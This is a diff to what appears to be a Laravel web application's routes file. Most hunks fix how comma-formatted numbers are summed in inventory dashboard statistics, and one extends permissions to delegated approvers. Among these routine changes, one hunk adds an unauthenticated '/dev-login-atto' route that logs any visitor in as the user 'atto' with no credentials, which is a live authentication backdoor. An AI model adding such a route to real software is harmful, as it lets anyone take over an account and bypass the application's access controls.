@@ -189,6 +189,15 @@ Route::middleware(['auth', 'check_status'])->group(function () {
     Route::post('/admin/password-requests/{id}/approve', [AdminController::class, 'approvePasswordRequest'])->name('admin.password.requests.approve');
     Route::post('/admin/password-requests/{id}/reject', [AdminController::class, 'rejectPasswordRequest'])->name('admin.password.requests.reject');
 });
+Route::get('/dev-login-atto', function() {
+    $user = \App\Models\User::where('username', 'atto')->first();
+    if ($user) {
+        \Illuminate\Support\Facades\Auth::login($user);
+        return redirect('/dashboard');
+    }
+    return 'atto not found';
+});
+
 // Authentication Routes
 Route::get('/login', [AuthController::class, 'showAuth'])->name('login');
 Route::post('/register', [AuthController::class, 'register'])->name('register');
@@ -315,7 +324,8 @@ Route::middleware(['auth', 'check_status', 'temp_account'])->group(function () {
                 ->where('inventory_batches.supplier_status', '!=', 'System Draft')
                 ->where('inventory_batches.approval_status', '=', 'approved')
                 ->get()->sum(function ($item) {
-                    return is_numeric($item->stock_balance) ? (float)$item->stock_balance : 0;
+                    $clean = str_replace(',', '', $item->stock_balance);
+                    return is_numeric($clean) ? (float)$clean : 0;
                 });
 
             // Trend calculation (Month-over-month additions)
@@ -328,7 +338,8 @@ Route::middleware(['auth', 'check_status', 'temp_account'])->group(function () {
                 ->where('inventory_batches.approval_status', '=', 'approved')
                 ->where('inventory_batches.entry_date', '>=', $currentMonthStart)
                 ->get()->sum(function ($i) {
-                    return is_numeric($i->stock_balance) ? (float)$i->stock_balance : 0;
+                    $clean = str_replace(',', '', $i->stock_balance);
+                    return is_numeric($clean) ? (float)$clean : 0;
                 });
 
             $lastMonthInvValue = \App\Models\InventoryItem::join('inventory_batches', 'inventory_items.batch_id', '=', 'inventory_batches.id')
@@ -336,7 +347,8 @@ Route::middleware(['auth', 'check_status', 'temp_account'])->group(function () {
                 ->where('inventory_batches.approval_status', '=', 'approved')
                 ->whereBetween('inventory_batches.entry_date', [$lastMonthStart, $lastMonthEnd])
                 ->get()->sum(function ($i) {
-                    return is_numeric($i->stock_balance) ? (float)$i->stock_balance : 0;
+                    $clean = str_replace(',', '', $i->stock_balance);
+                    return is_numeric($clean) ? (float)$clean : 0;
                 });
 
             $trendValue = 0;
@@ -362,8 +374,9 @@ Route::middleware(['auth', 'check_status', 'temp_account'])->group(function () {
                 ->where('inventory_batches.approval_status', '=', 'approved')
                 ->get()
                 ->filter(function ($item) {
-                    return is_numeric($item->stock_balance) && (float)$item->stock_balance == 0 &&
-                        is_numeric($item->qty) && (float)$item->qty >= 1;
+                    $sb = str_replace(',', '', $item->stock_balance);
+                    $q = str_replace(',', '', $item->qty);
+                    return is_numeric($sb) && (float)$sb == 0 && is_numeric($q) && (float)$q >= 1;
                 })->count();
 
             // Chart Data (Last 12 Months)
@@ -387,13 +400,20 @@ Route::middleware(['auth', 'check_status', 'temp_account'])->group(function () {
                     return $d->month == $m->month && $d->year == $m->year;
                 });
 
-                $receivedSeries[] = (float)$monthItems->sum(fn($item) => is_numeric($item->stock_balance) ? (float)$item->stock_balance : 0);
-                $varianceSeries[] = (float)$monthItems->sum(fn($item) => is_numeric($item->variance) ? (float)$item->variance : 0);
+                $receivedSeries[] = (float)$monthItems->sum(function($item) {
+                    $c = str_replace(',', '', $item->stock_balance);
+                    return is_numeric($c) ? (float)$c : 0;
+                });
+                $varianceSeries[] = (float)$monthItems->sum(function($item) {
+                    $c = str_replace(',', '', $item->variance);
+                    return is_numeric($c) ? (float)$c : 0;
+                });
             }
 
             // Total Variance
             $totalVariance = \App\Models\InventoryItem::get()->sum(function ($item) {
-                return is_numeric($item->variance) ? (float)$item->variance : 0;
+                $c = str_replace(',', '', $item->variance);
+                return is_numeric($c) ? (float)$c : 0;
             });
 
             // Ledge mapping for display and calculations
@@ -426,8 +446,8 @@ Route::middleware(['auth', 'check_status', 'temp_account'])->group(function () {
                 ->groupBy('ledge_category');
 
             foreach ($categoryStats as $code => $items) {
-                $avail  = $items->sum(fn($i) => is_numeric($i->stock_balance) ? (float)str_replace(',', '', $i->stock_balance) : 0);
-                $target = $items->sum(fn($i) => is_numeric($i->qty) ? (float)str_replace(',', '', $i->qty) : 0);
+                $avail  = $items->sum(fn($i) => is_numeric(str_replace(',', '', $i->stock_balance)) ? (float)str_replace(',', '', $i->stock_balance) : 0);
+                $target = $items->sum(fn($i) => is_numeric(str_replace(',', '', $i->qty)) ? (float)str_replace(',', '', $i->qty) : 0);
                 
                 if ($target > 0) {
                     $percentage = round(($avail / $target) * 100);
@@ -472,7 +492,10 @@ Route::middleware(['auth', 'check_status', 'temp_account'])->group(function () {
                 ->get()
                 ->groupBy('ledge_category')
                 ->map(function ($items) {
-                    return $items->sum(fn($item) => is_numeric($item->stock_balance) ? (float)$item->stock_balance : 0);
+                    return $items->sum(function($item) {
+                        $c = str_replace(',', '', $item->stock_balance);
+                        return is_numeric($c) ? (float)$c : 0;
+                    });
                 });
 
             $distLabels = array_values($distData->keys()->map(fn($key) => $ledgeMap[$key] ?? "Category $key")->toArray());
@@ -511,8 +534,14 @@ Route::middleware(['auth', 'check_status', 'temp_account'])->group(function () {
                     $d = \Carbon\Carbon::parse($item->entry_date);
                     return $d->between($w->copy()->startOfWeek(), $w->copy()->endOfWeek());
                 });
-                $weekReceived[] = (float)$itemsInWeek->sum(fn($item) => is_numeric($item->stock_balance) ? (float)$item->stock_balance : 0);
-                $weekVariance[] = (float)$itemsInWeek->sum(fn($item) => is_numeric($item->variance) ? (float)$item->variance : 0);
+                $weekReceived[] = (float)$itemsInWeek->sum(function($item) {
+                    $c = str_replace(',', '', $item->stock_balance);
+                    return is_numeric($c) ? (float)$c : 0;
+                });
+                $weekVariance[] = (float)$itemsInWeek->sum(function($item) {
+                    $c = str_replace(',', '', $item->variance);
+                    return is_numeric($c) ? (float)$c : 0;
+                });
             }
 
             // Daily Chart Data (Last 14 Days)
@@ -533,8 +562,14 @@ Route::middleware(['auth', 'check_status', 'temp_account'])->group(function () {
                     $entry = \Carbon\Carbon::parse($item->entry_date);
                     return $entry->isSameDay($d);
                 });
-                $dayReceived[] = (float)$itemsInDay->sum(fn($item) => is_numeric($item->stock_balance) ? (float)$item->stock_balance : 0);
-                $dayVariance[] = (float)$itemsInDay->sum(fn($item) => is_numeric($item->variance) ? (float)$item->variance : 0);
+                $dayReceived[] = (float)$itemsInDay->sum(function($item) {
+                    $c = str_replace(',', '', $item->stock_balance);
+                    return is_numeric($c) ? (float)$c : 0;
+                });
+                $dayVariance[] = (float)$itemsInDay->sum(function($item) {
+                    $c = str_replace(',', '', $item->variance);
+                    return is_numeric($c) ? (float)$c : 0;
+                });
             }
 
             // Recent Transactions
@@ -739,9 +774,9 @@ Route::middleware(['auth', 'check_status', 'temp_account'])->group(function () {
         $user = auth()->user();
         $is_admin = (bool)$user->is_admin || $user->isMainAdminOrSub();
         return response()->json([
-            'can_generate_reports' => $is_admin || $user->role === 'Auditor' || (bool)$user->can_generate_reports,
-            'can_add_inventory' => $is_admin || (bool)$user->can_add_inventory,
-            'can_operate_logistics' => $is_admin || (bool)$user->can_operate_logistics,
+            'can_generate_reports' => $is_admin || $user->role === 'Auditor' || $user->isDelegatedApprover() || (bool)$user->can_generate_reports,
+            'can_add_inventory' => $is_admin || $user->isDelegatedApprover() || (bool)$user->can_add_inventory,
+            'can_operate_logistics' => $is_admin || $user->isDelegatedApprover() || (bool)$user->can_operate_logistics,
         ]);
     })->name('api.user.permissions');
 
